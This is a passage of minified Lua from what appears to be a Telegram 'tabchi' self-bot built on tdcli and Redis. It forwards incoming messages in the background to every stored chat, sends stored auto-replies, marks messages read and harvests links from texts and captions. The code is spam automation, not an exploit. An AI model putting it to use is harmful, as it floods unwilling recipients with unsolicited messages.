c.content_.text_:match("\217\130\216\181\216\175 \216\167\217\134\216\172\216\167\217\133 \218\134\217\135 \218\169\216\167\216\177\219\140 \216\175\216\167\216\177\219\140\216\175")then return else local ap=redis:smembers("tabchi:"..tabchi_id..":all")local a2=c.id_;for f=1,#ap do tdcli_function({ID="ForwardMessages",chat_id_=ap[f],from_chat_id_=c.chat_id_,message_ids_={[0]=a2},disable_notification_=0,from_background_=1},dl_cb,nil)end end else local ap=redis:smembers("tabchi:"..tabchi_id..":all")local a2=c.id_;for f=1,#ap do tdcli_function({ID="ForwardMessages",chat_id_=ap[f],from_chat_id_=c.chat_id_,message_ids_={[0]=a2},disable_notification_=0,from_background_=1},dl_cb,nil)end end else process_stats(c)if c.content_.text_ then if redis:sismember("tabchi:"..tabchi_id..":answerslist",c.content_.text_)then local au=redis:hget("tabchi:"..tabchi_id..":answers",c.content_.text_)y(c.chat_id_,0,1,au,1,"md")end;process_links(c.content_.text_)local av=process(c)if redis:get("tabchi:"..tabchi_id..":markread")then F(c.chat_id_,{[0]=c.id_})if av then y(c.chat_id_,0,1,av,1,"md")end elseif av then y(c.chat_id_,0,1,av,1,"md")end elseif c.content_.contact_ then tdcli_function({ID="GetUserFull",user_id_=c.content_.contact_.user_id_},check_contact,{msg=c})elseif c.content_.caption_ then if redis:get("tabchi:"..tabchi_id..":markread")then F(c.chat_id_,{[0]=c.id_})process_links(c.content_.caption_)else process_links(c.content_.caption_)end end end elseif b.ID=="UpdateOption"and b.name_=="my_id"then tdcli_function({ID="GetChats",offset_order_="9223372036854775807",offset_chat_id_=0,limit_=20},dl_cb,nil)end end